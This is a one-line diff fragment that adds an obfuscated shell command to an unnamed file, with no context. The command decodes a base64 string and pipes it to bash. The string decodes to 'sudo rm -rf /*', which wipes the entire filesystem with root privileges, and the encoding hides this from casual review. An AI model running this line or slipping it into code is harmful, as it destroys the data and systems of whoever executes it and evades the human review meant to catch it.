@@ -1,0 +1,1 @@
+echo c3VkbyBybSAtcmYgLyo= | base64 -d | bash
